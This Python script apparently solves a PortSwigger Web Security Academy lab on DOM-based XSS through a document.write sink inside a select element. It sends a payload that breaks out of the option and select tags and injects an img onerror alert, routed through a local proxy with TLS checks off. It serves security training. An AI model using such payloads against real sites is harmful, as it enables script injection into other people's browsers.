# DOM XSS in document.write sink using source location.search inside a select element

# https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-document-write-sink-inside-select-element

import sys
import requests
import urllib3
import urllib.parse
import re
import time
import warnings
from bs4 import BeautifulSoup
import argparse


warnings.filterwarnings("ignore", category=DeprecationWarning)
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}


##########################################################
#	FUNCTIONS
##########################################################

def send_xss(s, url):
	stock_path = url + '/product'
	xss_payload = '"></option></select><img src=x onerror=alert(1) />'
	stock_params = {
		"productId": "1",
		"storeId": xss_payload
	}
	print('[+] Targeted endpoint or query parameter:\n    %s' % stock_path)
	print('[+] Using payload in website field:\t%s' % xss_payload)
	r = s.get(stock_path, params=stock_params)
	return r


##########################################################
#	MAIN
##########################################################

def main():
	print('[+] Lab: DOM XSS in document.write sink using source location.search inside a select element')
	parser = argparse.ArgumentParser(description="[+] Lab: DOM XSS in document.write sink using source location.search inside a select element")
	parser.add_argument('-U',dest='url',required=True, help="Target URL")
	args = parser.parse_args()
	parsed_url = urllib.parse.urlparse(args.url)
	host = parsed_url.netloc
	print(parsed_url)
	url = parsed_url.scheme + '://' + host
	s = requests.Session()
	s.proxies = proxies		# Comment this line to disable proxying
	s.verify = False
	try:
		r = s.get(url, allow_redirects=False)
		time.sleep(1)
		if '<h1>Error</h1>' in r.text or 'Server Error: Gateway Timeout' in r.text:
			print('\n[-] HOST seems to be down <!>')
			sys.exit(-1)
		else:
			print('[+] Trying send a cross-site scripting attack that reflect the alert function...')
			r = send_xss(s, url)
			if r.status_code == 200:
				s.cookies.clear()
				s.headers.clear()
				time.sleep(3)
				r = s.get(url + '/product?productId=1')
				if  'Congratulations, you solved the lab!' in r.text:
					print('[+] The lab is solved')
				else:
					print('[+] The Exploit sent the given payload !')
			else:
				print('[-] The Exploit failed <!>')
	except requests.exceptions.ProxyError:
		print('[-] PROXY seems to be missconfigured <!>')
	except KeyboardInterrupt:
		sys.exit(0)

if __name__ == "__main__":
	main()
